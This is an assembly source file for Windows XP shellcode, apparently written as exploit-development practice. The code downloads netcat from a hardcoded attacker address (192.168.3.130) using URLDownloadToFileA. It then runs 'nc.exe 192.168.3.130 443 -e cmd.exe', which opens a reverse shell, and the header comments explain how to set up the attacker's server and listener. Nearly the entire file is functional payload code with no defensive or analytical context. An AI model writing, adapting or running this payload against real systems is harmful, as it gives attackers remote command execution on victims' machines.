; Author	: RIZAL MUHAMMED [UB3RSiCK]
; Date		: 21/03/2018
; Filename	: URLDownload-Exec.nasm


; Desc		: Downloads and executes a netcat reverse shell
; Host server on attacker machine with nc.exe binary located in webroot
; Setup netcate listener on port 443

; WINDOWS XP SP3 specific addresses
; --------------------------------------------------------
; LoadLibraryA is located at 0x7c801d7b in kernel32.dll
; GetProcAddress is located at 0x7c80ae30 in kernel32.dll
; ExitProcess is located at 0x7c81cafa in kernel32.dll


section .text
global _start

_start:
	 
	; clear registers
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx

	; Load urlmon.dll library using LoadLibraryA locate in kernel32.dll
	jmp short getLibraryName
		retLibraryName:
			pop ecx
			xor edx, edx
			mov [ecx + 10], dl		; NULL terminate urlmon.dll string

			; HMODULE WINAPI LoadLibrary(
			;	  _In_ LPCTSTR lpFileName
			; );
			
			mov ebx, 0x7c801d7b	; LoadLibraryA
			push ecx		; Pointer to urlmon.dll NULL terminated
			call ebx		; Module handle is returned to EAX

	; Find the address of URLDownloadToFileA function in urlmon.dll using GetProcAddress
	jmp short getFuncName
		retFuncName:
			pop ecx
			xor edx, edx
			mov [ecx + 18], dl	; NULL terminate URLDownloadToFileA string

			; FARPROC WINAPI GetProcAddress(
			;	  _In_ HMODULE hModule,
			;	  _In_ LPCSTR  lpProcName
			; );			

			push ecx		; Pointer to  URLDownloadToFileA string
			push eax		; urlmon module handle
			mov ebx, 0x7c80ae30	; GetProcAddress 
			call ebx		; Returns address of URLDownloadToFileA in EAX

	; Get the pointer to download url string
	; Get the pointer to save filename
	; Download file using URLDownloadToFileA

	jmp short getDownloadUrl
		retURL:
			pop ebx
			xor edx, edx
			mov [ebx + 27], dl 

	jmp short getSaveFileName
		retSaveFileName:
			pop ecx
			xor edx, edx
			mov [ecx + 6], dl
			
			; HRESULT URLDownloadToFile(
			;             LPUNKNOWN            pCaller,		; If the calling application is not an ActiveX component, this value can be set to NULL
			;             LPCTSTR              szURL,		; A pointer to a string value that contains the URL to download
			;             LPCTSTR              szFileName,		; filename to save file
			;  _Reserved_ DWORD                dwReserved,		; Reserved. Must be set to 0
			;             LPBINDSTATUSCALLBACK lpfnCB		; This parameter can be set to NULL if status is not required.
			; );

			xor edx, edx
			push edx			; LPBINDSTATUSCALLBACK lpfnCB = NULL ; status not required
			push edx			; dwReserved 
			push ecx			; szFileName
			push ebx			; szURL
			push edx			; pCaller = NULL

			call eax			; call URLDownloadToFileA

	; Invoke netcat reverse shell using WinExec

	jmp short getShellCommand
		retShellCommand:
			pop ebx
			xor edx, edx
			mov [ebx + 35], dl
			
			; UINT WINAPI WinExec(
			;	  _In_ LPCSTR lpCmdLine,
			;	  _In_ UINT   uCmdShow
			; ); 
			
			xor eax, eax
			push eax			; uCmdShow
			push ebx			; nc reverse shell
			mov ecx, 0x7c8623ad		; WinExec
			call ecx


	exit:
		xor eax, eax
		push eax
		mov ebx, 0x7c81cafa			; ExitProcess
		call ebx


	getLibraryName:
		call retLibraryName
		db "urlmon.dllN"

	getFuncName:
		call retFuncName
		db "URLDownloadToFileAN"

	getDownloadUrl:
		call retURL
		db "http://192.168.3.130/nc.exeN"

	getSaveFileName:
		call retSaveFileName
		db "nc.exeN"
	
	getShellCommand:
		call retShellCommand
		db "nc.exe 192.168.3.130 443 -e cmd.exeN"
